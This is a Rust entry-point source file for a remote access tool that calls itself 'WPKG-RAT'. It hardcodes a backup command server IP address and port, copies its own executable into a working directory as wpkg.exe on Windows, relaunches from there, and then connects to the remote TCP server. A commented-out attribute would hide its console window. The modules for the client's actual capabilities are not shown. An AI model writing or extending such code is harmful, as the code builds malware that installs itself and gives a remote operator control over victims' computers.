// Remove console window in Windows OS
//#![windows_subsystem = "windows"]
// TODO: delete it
#![allow(dead_code)]

mod addreses;
mod client;
mod globals;
mod logger;
mod unwrap;
mod utils;
mod versions;

use std::env;

use tracing::*;

use crate::addreses::{Address, Adresses};
use crate::utils::Utils;

/// Server ip backup if api isn't available
pub const TCP_BACKUP_IP: &str = "136.243.156.104";
/// Server port backup if api isn't available   
pub const TCP_BACKUP_PORT: u32 = 3217;

#[tokio::main]
async fn main() {
    // init logger
    logger::init();

    println!("WPKG-RAT {}", env!("CARGO_PKG_VERSION"));

    let args: Vec<String> = env::args().collect();
    match args.iter().any(|v| v == "--update") {
        true => {
            let possision = args.iter().position(|r| r == "--update").unwrap();
            Utils::update(&args[possision + 1].to_string())
                .await
                .expect("Error updating");
        }
        false => (),
    }
    match Utils::check_updates().await {
        Ok(_) => info!("Updates has been checked"),
        Err(e) => error!("Failed to check updates: {e}"),
    }

    // get tcp server ip address from the api
    let tcp_address = Adresses::get().await.unwrap_or_default();
    let tcp_address = tcp_address
        .tcp
        .get(0)
        .unwrap_or(&Address::default())
        .format();

    #[cfg(not(target_os = "windows"))]
    warn!("RAT isn't runned on Windows. Some features may be unavailable. Use for debug only");

    #[cfg(target_os = "windows")]
    {
        use crate::utils::Utils;
        use std::env;
        use std::fs;
        use std::path::Path;
        use std::process;
        use sysinfo::{System, SystemExt};

        let install = || -> anyhow::Result<()> {
            let exe_path = env::current_exe()?.display().to_string();

            let config_dir = Utils::get_working_dir()?;
            let exe_target = format!("{}\\{}", &config_dir, "wpkg.exe");

            if exe_path != exe_target {
                info!("WPKG not installed. Installing in {}...", &config_dir);

                if !Path::new(&exe_target).exists() {
                    info!("Copying WPKG executable to {}...", exe_target);
                    fs::copy(exe_path, exe_target.clone())?;
                }

                //check if process is runned
                let mut runned: i32 = 0;
                let s = System::new_all();
                for _ in s.processes_by_name("wpkg.exe") {
                    runned += 1;
                }

                //run wpkg
                if runned <= 1 {
                    info!("Running WPKG...");
                    Utils::run_process_with_work_dir(&exe_target, "", false, &config_dir)?;
                } else {
                    error!("WPKG is runned. Exiting...");
                }

                process::exit(0);
            }
            Ok(())
        };

        if let Err(err) = install() {
            error!("Failed to install WPKG: {}", err);
            process::exit(0);
        }
    }
    // connect to the ServerD
    client::connect(tcp_address).await;
}
